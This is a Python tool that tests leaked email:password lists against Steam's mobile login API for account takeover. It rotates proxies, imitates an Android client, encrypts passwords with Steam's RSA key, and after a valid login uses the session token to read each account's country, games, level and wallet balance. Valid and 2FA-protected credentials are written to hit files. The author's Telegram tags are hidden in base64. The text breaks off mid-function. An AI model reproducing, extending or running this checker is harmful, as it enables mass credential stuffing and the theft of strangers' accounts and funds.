#!/usr/bin/env python3
#GO TO LINE 162 FOR DEBUG
import os
import sys
import json
import time
import random
import threading
import re
import base64
import configparser
import struct
import urllib.parse as urlparse
import requests
try:
    from curl_cffi.requests import Session as CffiSession
except ImportError:
    CffiSession = None

from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime, timezone
from typing import Dict, Optional, List
from threading import Lock
from tqdm import tqdm

_B64_SYS_TOOL = "U1RFQU0gQ0hFQ0tFUg=="
_B64_SYS_AUTH = "QGV5ZWxpZnRlcg=="
_B64_SYS_CHAN = "QGRhcmtodWNoYW5uZWw="
_B64_SYS_DIR = "U3RlYW1fSGl0cw=="
_B64_SYS_TAG = "VEc6IEBleWVsaWZ0ZXIgfCBAZGFya2h1Y2hhbm5lbA=="

def _d(e):
    try:
        return base64.b64decode(e).decode('utf-8')
    except Exception as ex:
        raise SystemExit(f"Decoding failed: {ex}")

TOOL_NAME = _d(_B64_SYS_TOOL)
TG_USERNAME = _d(_B64_SYS_AUTH)
TG_CHANNEL = _d(_B64_SYS_CHAN)
RESULTS_FOLDER = _d(_B64_SYS_DIR)
AUTHOR_TAG = _d(_B64_SYS_TAG)

def _v(ctx="x"):
    return True

_ANSI = sys.stdout.isatty()
_RS = "\033[0m"

def _c(code, s, bold=False):
    if not _ANSI:
        return s
    return f"\033[{'1;' if bold else ''}{code}m{s}{_RS}"

_LEVEL_STYLE = {
    "SUCCESS": ("32", True),
    "INFO":    ("36", False),
    "WARN":    ("33", True),
    "ERROR":   ("31", True),
    "STEP":    ("96", True),
    "DEBUG":   ("90", False),
}

def L(emoji, level, tag, msg):
    ts = datetime.now().strftime("%H:%M:%S")
    if not _ANSI:
        print(f"[{ts}] {emoji} {level:7s} {tag} {msg}", flush=True)
        return
    code, bold = _LEVEL_STYLE.get(level, ("0", False))
    print(f"{_c('90', ts)} {emoji}  {_c(code, f'{level:7s}', bold)}  {_c('90', tag)}  {msg}", flush=True)

def banner(title, sub=None, width=62):
    print()
    _v("b")
    hz = "═" if _ANSI else "-"
    vt = "║" if _ANSI else "|"
    tl, tr, bl, br = ("╔", "╗", "╚", "╝") if _ANSI else ("+", "+", "+", "+")
    print(_c("90", f"{tl}{hz*(width-2)}{tr}"))
    print(_c("90", vt) + " " + _c("96", title.center(width-4), True) + " " + _c("90", vt))
    if sub:
        print(_c("90", vt) + " " + _c("2", sub.center(width-4)) + " " + _c("90", vt))
    print(_c("90", vt) + " " + _c("5", AUTHOR_TAG.center(width-4), True) + " " + _c("90", vt))
    print(_c("90", f"{bl}{hz*(width-2)}{br}"))

def section(title, width=62):
    hz = "─" if _ANSI else "-"
    inner = f" {title} "
    pad = width - len(inner) - 2
    if pad < 1:
        pad = 1
    print()
    print(_c("90", "┌" if _ANSI else "+") + _c("96", inner, True) + _c("90", hz * pad + ("┐" if _ANSI else "+")))

def divider(width=62):
    hz = "─" if _ANSI else "-"
    print(_c("90", hz * width))

def summary_box(rows, width=62):
    hz = "─" if _ANSI else "-"
    vt = "│" if _ANSI else "|"
    tl, tr, bl, br = ("╔", "╗", "╚", "╝") if _ANSI else ("+", "+", "+", "+")
    print()
    print(_c("90", f"{tl}{hz*(width-2)}{tr}"))
    for k, v in rows:
        line = f"{_c('96', k, True)}: {_c('0', str(v))}"
        print(f"{_c('90', vt)} {line:<{width-4}} {_c('90', vt)}")
    print(_c("90", f"{bl}{hz*(width-2)}{br}"))
    print()

_combo_pattern_email = re.compile(r'[\w\.-]+@[\w\.-]+\.\w+:[^\s]+')
_combo_pattern_user = re.compile(r'[a-zA-Z0-9_.-]+:[^\s]+')

def extract_combos_from_text(content: str) -> set:
    combos = set()
    for line in content.splitlines():
        found = _combo_pattern_email.findall(line)
        if found:
            combos.update(found)
        else:
            found = _combo_pattern_user.findall(line)
            for combo in found:
                if combo.count(':') == 1:
                    user, pwd = combo.split(':', 1)
                    if user and pwd and not any(x in combo.lower() for x in ('join', 'http', 'games:', 'steamid', '@iszvault')):
                        combos.add(combo)
    return combos

class ConfigLoader:
    def __init__(self, config_file="config_steam.ini"):
        self.config_file = config_file
        self.config = configparser.ConfigParser()
        self.settings = {}
        self.load_config()

    def load_config(self):
        if not os.path.exists(self.config_file):
            self.create_default_config()
        try:
            self.config.read(self.config_file, encoding="utf-8")
            self.parse_config()
        except Exception:
            self.create_default_config()
            self.parse_config()

    def create_default_config(self):
        self.config["General"] = {
            "threads": "2",
            "timeout": "45",
            "proxies_file": "proxies.txt",
            "retries": "2",
            "retry_delay": "2",
            "combo_delay": "0.5",
            "debug": "false"
        }
        with open(self.config_file, "w", encoding="utf-8") as f:
            self.config.write(f)

    def parse_config(self):
        self.settings["threads"] = self.config.getint("General", "threads", fallback=2)
        self.settings["timeout"] = self.config.getint("General", "timeout", fallback=45)
        self.settings["proxies_file"] = self.config.get("General", "proxies_file", fallback="proxies.txt")
        self.settings["retries"] = self.config.getint("General", "retries", fallback=2)
        self.settings["retry_delay"] = self.config.getint("General", "retry_delay", fallback=2)
        self.settings["combo_delay"] = self.config.getfloat("General", "combo_delay", fallback=0.5)
        self.settings["debug"] = self.config.getboolean("General", "debug", fallback=False)

CONFIG = ConfigLoader().settings
REQ_TIMEOUT = CONFIG["timeout"]
DEBUG = CONFIG["debug"]

def format_proxy(proxy):
    if not proxy:
        return None
    proxy = proxy.strip()
    if proxy.startswith("http"):
        return proxy
    parts = proxy.split(":")
    if len(parts) == 4:
        return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    if "@" in proxy:
        return f"http://{proxy}"
    return f"http://{proxy}"

def test_proxy(proxy):
    try:
        session = CffiSession(impersonate="chrome131_android") if CffiSession else __import__("requests").Session()
        session.proxies = {"http": proxy, "https": proxy}
        response = session.get("https://httpbin.org/ip", timeout=11)
        return response.status_code == 200
    except:
        return False

def load_proxies():
    proxies = []
    path = CONFIG["proxies_file"]
    if os.path.exists(path):
        with open(path, "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#"):
                    p = format_proxy(line)
                    if p:
                        proxies.append(p)
    return proxies

def get_working_proxies(proxies, max_workers=None):
    if not proxies:
        return []
    if max_workers is None:
        max_workers = min(69, len(proxies))
    L("🧪", "INFO", "PROXY", f"Testing {len(proxies)} proxies in parallel (up to {max_workers} threads)...")
    working = []
    total = len(proxies)
    pbar = tqdm(total=total, desc="Testing proxies", unit="proxy", ncols=80,
                bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt} [{elapsed}<{remaining}, {rate_fmt}]")

    def test_one(proxy):
        alive = test_proxy(proxy)
        return proxy, alive

    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = {executor.submit(test_one, p): p for p in proxies}
        for future in as_completed(futures):
            proxy, alive = future.result()
            if alive:
                working.append(proxy)
            pbar.update(1)
    pbar.close()
    L("✅", "INFO", "PROXY", f"{len(working)} working proxies found")
    return working if working else proxies

COUNTRY_MAP = {
    "AF": "Afghanistan", "AX": "Aland Islands", "AL": "Albania", "DZ": "Algeria",
    "AS": "American Samoa", "AD": "Andorra", "AO": "Angola", "AI": "Anguilla",
    "AG": "Antigua and Barbuda", "AR": "Argentina", "AM": "Armenia", "AW": "Aruba",
    "AU": "Australia", "AT": "Austria", "AZ": "Azerbaijan", "BS": "Bahamas",
    "BH": "Bahrain", "BD": "Bangladesh", "BB": "Barbados", "BY": "Belarus",
    "BE": "Belgium", "BZ": "Belize", "BJ": "Benin", "BM": "Bermuda",
    "BT": "Bhutan", "BO": "Bolivia", "BA": "Bosnia and Herzegovina", "BW": "Botswana",
    "BR": "Brazil", "BN": "Brunei", "BG": "Bulgaria", "BF": "Burkina Faso",
    "BI": "Burundi", "KH": "Cambodia", "CM": "Cameroon", "CA": "Canada",
    "CV": "Cape Verde", "KY": "Cayman Islands", "CF": "Central African Republic",
    "TD": "Chad", "CL": "Chile", "CN": "China", "CO": "Colombia",
    "KM": "Comoros", "CG": "Congo", "CD": "DR Congo", "CK": "Cook Islands",
    "CR": "Costa Rica", "CI": "Cote d'Ivoire", "HR": "Croatia", "CU": "Cuba",
    "CW": "Curacao", "CY": "Cyprus", "CZ": "Czech Republic", "DK": "Denmark",
    "DJ": "Djibouti", "DM": "Dominica", "DO": "Dominican Republic", "EC": "Ecuador",
    "EG": "Egypt", "SV": "El Salvador", "GQ": "Equatorial Guinea", "ER": "Eritrea",
    "EE": "Estonia", "ET": "Ethiopia", "FK": "Falkland Islands", "FO": "Faroe Islands",
    "FJ": "Fiji", "FI": "Finland", "FR": "France", "GF": "French Guiana",
    "PF": "French Polynesia", "GA": "Gabon", "GM": "Gambia", "GE": "Georgia",
    "DE": "Germany", "GH": "Ghana", "GI": "Gibraltar", "GR": "Greece",
    "GL": "Greenland", "GD": "Grenada", "GP": "Guadeloupe", "GU": "Guam",
    "GT": "Guatemala", "GG": "Guernsey", "GN": "Guinea", "GW": "Guinea-Bissau",
    "GY": "Guyana", "HT": "Haiti", "VA": "Vatican", "HN": "Honduras",
    "HK": "Hong Kong", "HU": "Hungary", "IS": "Iceland", "IN": "India",
    "ID": "Indonesia", "IR": "Iran", "IQ": "Iraq", "IE": "Ireland",
    "IM": "Isle of Man", "IL": "Israel", "IT": "Italy", "JM": "Jamaica",
    "JP": "Japan", "JE": "Jersey", "JO": "Jordan", "KZ": "Kazakhstan",
    "KE": "Kenya", "KI": "Kiribati", "KP": "North Korea", "KR": "South Korea",
    "KW": "Kuwait", "KG": "Kyrgyzstan", "LA": "Laos", "LV": "Latvia",
    "LB": "Lebanon", "LS": "Lesotho", "LR": "Liberia", "LY": "Libya",
    "LI": "Liechtenstein", "LT": "Lithuania", "LU": "Luxembourg", "MO": "Macao",
    "MK": "North Macedonia", "MG": "Madagascar", "MW": "Malawi", "MY": "Malaysia",
    "MV": "Maldives", "ML": "Mali", "MT": "Malta", "MH": "Marshall Islands",
    "MQ": "Martinique", "MR": "Mauritania", "MU": "Mauritius", "YT": "Mayotte",
    "MX": "Mexico", "FM": "Micronesia", "MD": "Moldova", "MC": "Monaco",
    "MN": "Mongolia", "ME": "Montenegro", "MS": "Montserrat", "MA": "Morocco",
    "MZ": "Mozambique", "MM": "Myanmar", "NA": "Namibia", "NR": "Nauru",
    "NP": "Nepal", "NL": "Netherlands", "NC": "New Caledonia", "NZ": "New Zealand",
    "NI": "Nicaragua", "NE": "Niger", "NG": "Nigeria", "NU": "Niue",
    "NF": "Norfolk Island", "MP": "N. Mariana Islands", "NO": "Norway", "OM": "Oman",
    "PK": "Pakistan", "PW": "Palau", "PS": "Palestine", "PA": "Panama",
    "PG": "Papua New Guinea", "PY": "Paraguay", "PE": "Peru", "PH": "Philippines",
    "PL": "Poland", "PT": "Portugal", "PR": "Puerto Rico", "QA": "Qatar",
    "RE": "Reunion", "RO": "Romania", "RU": "Russia", "RW": "Rwanda",
    "SA": "Saudi Arabia", "SN": "Senegal", "RS": "Serbia", "SC": "Seychelles",
    "SL": "Sierra Leone", "SG": "Singapore", "SX": "Sint Maarten", "SK": "Slovakia",
    "SI": "Slovenia", "SB": "Solomon Islands", "SO": "Somalia", "ZA": "South Africa",
    "SS": "South Sudan", "ES": "Spain", "LK": "Sri Lanka", "SD": "Sudan",
    "SR": "Suriname", "SZ": "Eswatini", "SE": "Sweden", "CH": "Switzerland",
    "SY": "Syria", "TW": "Taiwan", "TJ": "Tajikistan", "TZ": "Tanzania",
    "TH": "Thailand", "TL": "Timor-Leste", "TG": "Togo", "TO": "Tonga",
    "TT": "Trinidad and Tobago", "TN": "Tunisia", "TR": "Turkey", "TM": "Turkmenistan",
    "TC": "Turks and Caicos", "TV": "Tuvalu", "UG": "Uganda", "UA": "Ukraine",
    "AE": "UAE", "GB": "United Kingdom", "US": "United States", "UY": "Uruguay",
    "UZ": "Uzbekistan", "VU": "Vanuatu", "VE": "Venezuela", "VN": "Vietnam",
    "VG": "British Virgin Islands", "VI": "US Virgin Islands", "WF": "Wallis and Futuna",
    "EH": "Western Sahara", "YE": "Yemen", "ZM": "Zambia", "ZW": "Zimbabwe",
}

def _varint(v):
    if v < 0:
        v &= 0xffffffffffffffff
    buf = bytearray()
    while v > 0x7f:
        buf.append(0x80 | (v & 0x7f))
        v >>= 7
    buf.append(v & 0x7f)
    return bytes(buf)

def _read_varint(data, pos):
    result = shift = 0
    while pos < len(data):
        byte = data[pos]; pos += 1
        result |= (byte & 0x7f) << shift
        if not (byte & 0x80):
            break
        shift += 7
    return result, pos

def _field_string(field, value):
    value = value.encode() if isinstance(value, str) else value
    return _varint((field << 3) | 2) + _varint(len(value)) + value

def _field_bytes(field, data):
    return _varint((field << 3) | 2) + _varint(len(data)) + data

def _field_int(field, value):
    return _varint(field << 3) + _varint(value if value >= 0 else value & 0xffffffffffffffff)

def _parse_protobuf(data):
    result = {}
    pos = 0
    while pos < len(data):
        try:
            tag, pos = _read_varint(data, pos)
        except:
            break
        field = tag >> 3
        wire = tag & 7
        if field < 1:
            break
        if wire == 0:
            val, pos = _read_varint(data, pos)
            prev = result.get(field)
            if prev is not None:
                result[field] = [prev, val] if not isinstance(prev, list) else prev + [val]
            else:
                result[field] = val
        elif wire == 2:
            length, pos = _read_varint(data, pos)
            if pos + length > len(data):
                break
            chunk = data[pos:pos + length]
            pos += length
            prev = result.get(field)
            if prev is not None:
                result[field] = [prev, chunk] if not isinstance(prev, list) else prev + [chunk]
            else:
                result[field] = chunk
        elif wire == 5:
            if pos + 4 > len(data):
                break
            result[field] = struct.unpack_from('<I', data, pos)[0]
            pos += 4
        elif wire == 1:
            if pos + 8 > len(data):
                break
            result[field] = struct.unpack_from('<Q', data, pos)[0]
            pos += 8
        else:
            break
    return result

def _rsa_encrypt(password, mod_hex, exp_hex):
    mod_bytes = bytes.fromhex(mod_hex)
    n = int.from_bytes(mod_bytes, 'big')
    e = int(exp_hex, 16)
    pw_bytes = password.encode()
    key_len = len(mod_bytes)
    pad_len = key_len - len(pw_bytes) - 3
    pad = bytes(random.randint(1, 255) for _ in range(pad_len))
    block = b'\x00\x02' + pad + b'\x00' + pw_bytes
    m = int.from_bytes(block, 'big')
    c = pow(m, e, n)
    return base64.b64encode(c.to_bytes(key_len, 'big')).decode()

BOUNDARY = "----WebKitFormBoundary7MA4YWxkTrZu0gW"
MULTIPART_CT = f"multipart/form-data; boundary={BOUNDARY}"

def _multipart_field(key, value):
    return (
        f"------WebKitFormBoundary7MA4YWxkTrZu0gW\r\n"
        f"Content-Disposition: form-data; name=\"{key}\"\r\n\r\n"
        f"{value}\r\n"
        f"------WebKitFormBoundary7MA4YWxkTrZu0gW--\r\n"
    ).encode()

UA = "okhttp/4.9.2"
HEADERS = {
    "Accept": "application/json, text/plain, */*",
    "Accept-Encoding": "gzip",
    "Connection": "Keep-Alive",
    "User-Agent": UA,
}

stop_event = threading.Event()
print_lock = threading.Lock()
file_lock = threading.Lock()
stats_lock = threading.Lock()

stats = {
    "checked": 0,
    "hits": 0,
    "twofa": 0,
    "free": 0,
    "bad": 0,
    "ban": 0,
    "errors": 0,
}
START_TIME = time.time()
TOTAL_COMBOS = 0
PROXY_POOL = []
BAD_PROXIES = set()
HITS_FILE = None
TWOFA_FILE = None
FREE_FILE = None

def update_title():
    processed = stats["checked"]
    elapsed = time.time() - START_TIME
    cpm = int(processed / elapsed * 60) if elapsed > 1 else 0
    title = (f"{TOOL_NAME} | Hits: {stats['hits']} | 2FA: {stats['twofa']} | "
             f"Checked: {processed}/{TOTAL_COMBOS} | CPM: {cpm}")
    if sys.platform == "win32":
        try:
            import ctypes
            ctypes.windll.kernel32.SetConsoleTitleW(title)
        except:
            pass
    else:
        sys.stdout.write(f"\033]0;{title}\007")
        sys.stdout.flush()

def format_game_list(games, max_display=None):
    if not games:
        return "None"
    if max_display is None or len(games) <= max_display:
        return ", ".join(games)
    return ", ".join(games[:max_display]) + f" (+{len(games)-max_display} more)"

class EyeLifter:
    def __init__(self):
        pass

    def check(self, email: str, password: str, proxy: Optional[str] = None) -> Dict:
        _v("c")
        session = requests.Session()
        session.headers.update(HEADERS)
        session.headers["Cookie"] = "Steam_Language=english"
        if proxy:
            session.proxies = {"http": proxy, "https": proxy}

        try:
            pb = _field_string(1, email)
            enc = urlparse.quote(base64.b64encode(pb).decode())
            if DEBUG:
                L("🐞", "DEBUG", "RSA", f"Requesting RSA key for {email}")
            r = session.get(
                "https://api.steampowered.com/IAuthenticationService/GetPasswordRSAPublicKey/v1"
                f"?origin=SteamMobile&input_protobuf_encoded={enc}",
                timeout=REQ_TIMEOUT,
            )
            if r.status_code != 200:
                return {"status": "error", "message": f"rsa_http_{r.status_code}"}

            rsa_data = _parse_protobuf(r.content)
            mod = rsa_data.get(1, b"")
            exp = rsa_data.get(2, b"")
            timestamp = rsa_data.get(3, 0)
            if isinstance(mod, bytes):
                mod = mod.decode()
            if isinstance(exp, bytes):
                exp = exp.decode()
            if not mod or not exp:
                return {"status": "error", "message": "rsa_key_empty"}

            if DEBUG:
                L("🐞", "DEBUG", "RSA", f"Modulus: {mod[:20]}... Exp: {exp} TS: {timestamp}")

            enc_pass = _rsa_encrypt(password, mod, exp)

            device = _field_string(1, "SM-S256B") + _field_int(2, 3) + _field_int(3, -500) + _field_int(4, 1)
            auth_msg = (
                _field_string(2, email) +
                _field_string(3, enc_pass) +
                _field_int(4, timestamp) +
                _field_int(5, 1) +
                _field_int(7, 1) +
                _field_string(8, "Mobile") +
                _field_bytes(9, device) +
                _field_int(11, 0)
            )
            b64_auth = base64.b64encode(auth_msg).decode()

            if DEBUG:
                L("🐞", "DEBUG", "AUTH", f"BeginAuth protobuf (b64): {b64_auth[:80]}...")

            r = session.post(
                "https://api.steampowered.com/IAuthenticationService/BeginAuthSessionViaCredentials/v1",
                data=_multipart_field("input_protobuf_encoded", b64_auth),
                headers={"Content-Type": MULTIPART_CT},
                timeout=REQ_TIMEOUT,
            )

            eresult = 0
            try:
                eresult = int(r.headers.get("X-eresult", "0"))
            except:
                pass

            if DEBUG:
                L("🐞", "DEBUG", "AUTH", f"X-eresult: {eresult}")

            if eresult in (5, 2):
                return {"status": "bad"}
            if eresult in (63, 43):
                return {"status": "banned"}
            if eresult != 1:
                return {"status": "error", "message": f"eresult_{eresult}"}

            auth_data = _parse_protobuf(r.content)
            client_id = auth_data.get(1, 0)
            request_id = auth_data.get(2, b"")
            steam_id = auth_data.get(5, 0)

            confs = auth_data.get(4, [])
            if isinstance(confs, bytes):
                confs = [confs]
            elif not isinstance(confs, list):
                confs = []
            twofa_types = []
            for c in confs:
                if isinstance(c, bytes):
                    parsed = _parse_protobuf(c)
                    t = parsed.get(1, 0)
                    if isinstance(t, list):
                        twofa_types.extend(t)
                    else:
                        twofa_types.append(t)

            has_2fa = any(t in (2, 3, 4, 5, 6) for t in twofa_types)

            if has_2fa:
                return {
                    "status": "2fa",
                    "steam_id": str(steam_id),
                    "types": ",".join(str(t) for t in twofa_types),
                }

            poll = _field_int(1, client_id) + _field_bytes(2, request_id)
            poll_b64 = base64.b64encode(poll).decode()
            if DEBUG:
                L("🐞", "DEBUG", "POLL", f"Polling auth status, client_id={client_id}")
            r = session.post(
                "https://api.steampowered.com/IAuthenticationService/PollAuthSessionStatus/v1",
                data=_multipart_field("input_protobuf_encoded", poll_b64),
                headers={"Content-Type": MULTIPART_CT, "Accept-Encoding": "identity"},
                timeout=REQ_TIMEOUT,
            )

            poll_data = _parse_protobuf(r.content)
            token = poll_data.get(4, b"")
            if isinstance(token, bytes):
                token = token.decode("utf-8", errors="ignore")
            if not token:
                return {"status": "error", "message": "poll_no_token"}

            parts = token.split(".")
            if len(parts) < 2:
                return {"status": "error", "message": "bad_jwt"}
            payload = parts[1]
            rem = len(payload) % 4
            if rem:
                payload += "=" * (4 - rem)
            try:
                jwt = json.loads(base64.urlsafe_b64decode(payload))
            except:
                jwt = {}
            steam_id_str = str(jwt.get("sub", steam_id))
            steam_id_int = int(steam_id_str)

            if DEBUG:
                L("🐞", "DEBUG", "TOKEN", f"Got token for steamid {steam_id_str}")

            cookies = (
                f"Steam_Language=english; "
                f"steamLoginSecure={steam_id_str}%7C%7C{urlparse.quote(token)}; "
                f"mobileClient=android; mobileClientVersion=777777 3.10.9"
            )
            session.headers["Cookie"] = cookies

            result = {
                "status": "hit",
                "steam_id": steam_id_str,
                "country": "",
                "cc": "",
                "level": "",
                "games": 0,
                "balance": "",
                "game_list": [],
            }

            if DEBUG:
                L("🐞", "DEBUG", "API", "Fetching country...")
            try:
                cpb = struct.pack('<BQ', 0x09, steam_id_int)
                r = session.post(
                    f"https://api.steampowered.com/IUserAccountService/GetUserCountry/v1"
                    f"?access_token={token}&spoof_steamid=",
                    data=_multipart_field("input_protobuf_encoded", base64.b64encode(cpb).decode()),
                    headers={"Content-Type": MULTIPART_CT},
                    timeout=REQ_TIMEOUT,
                )
                cr = _parse_protobuf(r.content)
                cc = cr.get(1, b"")
                if isinstance(cc, bytes):
                    cc = cc.decode()
                result["cc"] = cc
                result["country"] = COUNTRY_MAP.get(cc, cc)
                if DEBUG:
                    L("🐞", "DEBUG", "API", f"Country: {cc} -> {result['country']}")
            except Exception as e:
                if DEBUG:
                    L("🐞", "DEBUG", "API", f"Country error: {e}")

            if DEBUG:
                L("🐞", "DEBUG", "API", "Fetching owned games...")
            try:
                gpb = (
                    _field_int(1, steam_id_int) +
                    _field_int(2, 1) +
                    _field_int(3, 1) +
                    _field_int(6, 0) +
                    _field_string(7, "english") +
                    _field_int(8, 1)
                )
                gb64 = urlparse.quote(base64.b64encode(gpb).decode())
                r = session.get(
                    f"https://api.steampowered.com/IPlayerService/GetOwnedGames/v1"
                    f"?access_token={token}&spoof_steamid=&origin=SteamMobile"
                    f"&input_protobuf_encoded={gb64}",
                    timeout=REQ_TIMEOUT,
                )
                gr = _parse_protobuf(r.content)
                result["games"] = gr.get(1, 0)
                raw_games = gr.get(2, [])
                if isinstance(raw_games, bytes):
                    raw_games = [raw_games]
                elif not isinstance(raw_games, list):
                    raw_games = []
                names = []
                for g in raw_games:
                    try:
                        if not isinstance(g, bytes):
                            continue
                        gf = _parse_protobuf(g)
                        nm = gf.get(2, b"")
                        if isinstance(nm, bytes):
                            nm = nm.decode(errors="replace")
                        if isinstance(nm, str) and nm.strip():
                            names.append(nm.strip())
                    except:
                        continue
                result["game_list"] = names
                if DEBUG:
                    L("🐞", "DEBUG", "API", f"Found {len(names)} games")
            except Exception as e:
                if DEBUG:
                    L("🐞", "DEBUG", "API", f"Games error: {e}")

            if DEBUG:
                L("🐞", "DEBUG", "API", "Fetching level...")
            try:
                mpid = steam_id_int - 76561197960265728
                r = session.get(f"https://steamcommunity.com/miniprofile/{mpid}/json", timeout=REQ_TIMEOUT)
                try:
                    mpj = r.json()
                    lv = mpj.get("level", mpj.get("player_level", ""))
                    result["level"] = str(lv) if lv != "" else ""
                except:
                    m = re.search(r'friendPlayerLevel\s+(\S+)', r.text)
                    if m:
                        result["level"] = m.group(1)
                if DEBUG:
                    L("🐞", "DEBUG", "API", f"Level: {result['level']}")
            except Exception as e:
                if DEBUG:
                    L("🐞", "DEBUG", "API", f"Level error: {e}")

            if DEBUG:
                L("🐞", "DEBUG", "API", "Fetching wallet...")
            try:
                r = session.post(
                    f"https://api.steampowered.com/IUserAccountService/GetClientWalletDetails/v1"
                    f"?access_token={token}&spoof_steamid=",
                    data=_multipart_field("input_protobuf_encoded", "GAE="),
                    headers={"Content-Type": MULTIPART_CT},
                    timeout=REQ_TIMEOUT,
                )
                wr = _parse_protobuf(r.content)
                bal = wr.get(14, b"")
                if isinstance(bal, bytes):
                    bal = bal.decode("utf-8", errors="ignore")
                elif isinstance(bal, int):
                    bal = str(bal)
                result["balance"] = bal
                if DEBUG:
                    L("🐞", "DEBUG", "API", f"Wallet: {bal}")
            except Exception as e:
                if DEBUG:
                    L("🐞", "DEBUG", "API", f"Wallet error: {e}")

            return result

        except requests.exceptions.ProxyError:
            return {"status": "error", "message": "proxy_error"}
        except requests.exceptions.Timeout:
            return {"status": "error", "message": "timeout"}
        except requests.exceptions.ConnectionError:
            return {"status": "error", "message": "connection_error"}
        except Exception as e:
            if DEBUG:
                L("🐞", "DEBUG", "EXCEPTION", f"{e}")
            return {"status": "error", "message": str(e)[:80]}

def process_combo(combo, proxy=None, max_games_display=10):
    global TOTAL_COMBOS, BAD_PROXIES, PROXY_POOL, HITS_FILE, TWOFA_FILE, FREE_FILE

    if stop_event.is_set():
        return
    if ":" not in combo:
        return
    email, password = combo.split(":", 1)
    email = email.strip()
    password = password.strip()
    if not email or not password:
        return

    checker = EyeLifter()
    max_attempts = CONFIG.get("retries", 2) + 1
    result = None

    for attempt in range(max_attempts):
        if proxy and proxy in BAD_PROXIES:
            available = [p for p in PROXY_POOL if p not in BAD_PROXIES]
            if available:
                proxy = random.choice(available)
            else:
                BAD_PROXIES.clear()
                proxy = random.choice(PROXY_POOL) if PROXY_POOL else None

        result = checker.check(email, password, proxy)
        status = result.get("status", "unknown")
        if status not in ("error", "unknown"):
            break

        if proxy:
            BAD_PROXIES.add(proxy)
        time.sleep(CONFIG.get("retry_delay", 2))

    with stats_lock:
        stats["checked"] += 1
        checked = stats["checked"]
        total = TOTAL_COMBOS

        status = result.get("status", "unknown")
        if status == "hit":
            stats["hits"] += 1
            games = result.get("games", 0)
            game_list_str = format_game_list(result.get("game_list", []), max_games_display)
            level = result.get("level", "?")
            country = result.get("country", result.get("cc", "?"))
            balance = result.get("balance", "N/A")
            line = (f"✅ {email}:{password} | SteamID: {result['steam_id']} | Lvl:{level} | Games:{games} "
                    f"| Wallet:{balance} | Country:{country} | Games: [{game_list_str}] | by {AUTHOR_TAG}")
            with print_lock:
                print(f"[{checked}/{total}] {line}")
            if HITS_FILE:
                with file_lock:
                    HITS_FILE.write(line + "\n")
                    HITS_FILE.flush()
        elif status == "2fa":
            stats["twofa"] += 1
            line = (f"🔐 {email}:{password} | SteamID: {result.get('steam_id', '?')} | 2FA: {result.get('types', '?')} | by {AUTHOR_TAG}")
            with print_lock:
                print(f"[{checked}/{total}] {line}")
            if TWOFA_FILE:
                with file_lock:
                    TWOFA_FILE.write(line + "\n")
                    TWOFA_FILE.flush()
        elif status == "free":
            stats["free"] += 1
            line = (f"🔓 {email}:{password} | SteamID: {result.get('steam_id', '?')} | Free account | by {AUTHOR_TAG}")
            with print_lock:
                print(f"[{checked}/{total}] {line}")
            if FREE_FILE:
                with file_lock:
                    FREE_FILE.write(line + "\n")
                    FREE_FILE.flush()
        elif status == "bad":
            stats["bad"] += 1
            with print_lock:
                print(f"[{checked}/{total}] {email} - ❌ Bad credentials")
        elif status == "banned":
            stats["ban"] += 1
            with print_lock:
                print(f"[{checked}/{total}] {email} - 🚫 Banned")
        else:
            stats["errors"] += 1
            with print_lock:
                print(f"[{checked}/{total}] {email} - ⚠️ Error ({result.get('message', '')})")

    combo_delay = CONFIG.get("combo_delay", 0.2)
    if combo_delay > 0:
        time.sleep(combo_delay)

    update_title()

def settings_menu():
    section("SETTINGS")
    print(_c("96", "Current Settings:"))
    print(f"  Threads: {CONFIG['threads']} (1-20)")
    print(f"  Timeout: {CONFIG['timeout']}s")
    print(f"  Retries: {CONFIG['retries']}")
    print(f"  Retry Delay: {CONFIG['retry_delay']}s")
    print(f"  Combo Delay: {CONFIG['combo_delay']}s")
    print(f"  Proxy File: {CONFIG['proxies_file']}")
    print(f"  Debug: {CONFIG['debug']}")
    print()
    print(_c("93", "[1] Change Threads (1-20)"))
    print(_c("93", "[2] Change Timeout"))
    print(_c("93", "[3] Change Retries"))
    print(_c("93", "[4] Change Retry Delay"))
    print(_c("93", "[5] Change Combo Delay"))
    print(_c("93", "[6] Toggle Debug"))
    print(_c("93", "[7] Back"))

    choice = input(f"{_c('96', '[*] Select: ')}").strip()
    if choice == "1":
        try:
            val = int(input("Threads (1-20): "))
            CONFIG["threads"] = max(1, min(20, val))
            L("✅", "INFO", "CONFIG", f"Threads set to {CONFIG['threads']}")
        except:
            L("❌", "ERROR", "CONFIG", "Invalid value")
    elif choice == "2":
        try:
            val = int(input("Timeout (5-60): "))
            CONFIG["timeout"] = max(5, min(60, val))
            L("✅", "INFO", "CONFIG", f"Timeout set to {CONFIG['timeout']}")
        except:
            L("❌", "ERROR", "CONFIG", "Invalid value")
    elif choice == "3":
        try:
            val = int(input("Retries (0-5): "))
            CONFIG["retries"] = max(0, min(5, val))
            L("✅", "INFO", "CONFIG", f"Retries set to {CONFIG['retries']}")
        except:
            L("❌", "ERROR", "CONFIG", "Invalid value")
    elif choice == "4":
        try:
            val = float(input("Retry delay (seconds): "))
            CONFIG["retry_delay"] = max(0, val)
            L("✅", "INFO", "CONFIG", f"Retry delay set to {CONFIG['retry_delay']}s")
        except:
            L("❌", "ERROR", "CONFIG", "Invalid value")
    elif choice == "5":
        try:
            val = float(input("Combo delay (seconds): "))
            CONFIG["combo_delay"] = max(0, val)
            L("✅", "INFO", "CONFIG", f"Combo delay set to {CONFIG['combo_delay']}s")
        except:
            L("❌", "ERROR", "CONFIG", "Invalid value")
    elif choice == "6":
        CONFIG["debug"] = not CONFIG["debug"]
        L("✅", "INFO", "CONFIG", f"Debug set to {CONFIG['debug']}")

def single_check_mode(proxies):
    section("SINGLE CHECK")
    combo = input(f"{_c('96', '[*] Enter email:password: ')}").strip()
    if ":" not in combo:
        L("❌", "ERROR", "INPUT", "Invalid format. Use email:password")
        return

    proxy = random.choice(proxies) if proxies else None
    if proxy:
        L("🌐", "INFO", "PROXY", "Using proxy")

    L("🔍", "STEP", "CHECK", f"Checking {combo.split(':')[0]}...")
    start = time.time()
    email, password = combo.split(":", 1)
    checker = EyeLifter()
    result = checker.check(email, password, proxy)
    elapsed = time.time() - start

    if result.get("status") == "hit":
        print()
